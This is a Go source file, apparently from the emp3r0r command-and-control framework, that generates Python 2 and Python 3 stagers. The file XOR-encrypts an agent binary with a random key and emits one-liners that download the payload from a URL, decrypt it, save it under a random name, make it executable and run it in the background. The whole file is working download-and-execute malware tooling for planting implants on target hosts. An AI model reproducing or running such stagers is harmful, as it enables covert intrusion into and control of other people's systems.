//go:build linux
// +build linux

package cc

import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func python_http_xor_download_exec(py_version, agent_bin_path, url string) (ret []byte) {
	// encrypt payload (agent binary)
	key, err := tun.GenerateRandomBytes(10)
	if err != nil {
		CliPrintError("python stager failed to generate random key: %v", err)
		return
	}
	fdata, err := os.ReadFile(agent_bin_path)
	if err != nil {
		CliPrintError("python stager failed to read agent binary: %v", err)
		return
	}
	enc_bin := tun.XOREncrypt(key, fdata)
	err = os.WriteFile(fmt.Sprintf("%s.enc", agent_bin_path), enc_bin, 0o600)
	if err != nil {
		CliPrintError("Saving XOR encryped agent binary: %v", err)
		return
	}

	var py_template string

	switch py_version {
	case "python2":
		// python code
		py_template = fmt.Sprintf(`_A='%s'
import struct,binascii,urllib2,os
def xor_decrypt(key,ciphertext):return ''.join([chr(ord(B)^ord(key[A%%len(key)]))for(A,B)in enumerate(ciphertext)])
def download_file(url):A=urllib2.urlopen(url);B=A.read();return B
open(_A,'wb+').write(xor_decrypt('%s',download_file('%s')))
os.chmod(_A,0o755)
os.system('./%%s&'%%_A)`, util.RandStr(22), key, url)

	case "python3":
		// python3 code
		py_template = fmt.Sprintf(`_A='%s';import urllib.request,os;open(_A,'wb').write(bytes([b^ord('%s'[i%%len('%s')])for i,b in enumerate(urllib.request.urlopen('%s').read())]));os.chmod(_A,0o755);os.system('./%%s &'%%_A)`, util.RandStr(22), key, key, url)

	default:
		CliPrintError("Unsupported Python version: %s", py_version)

	}

	return []byte(py_template)
}
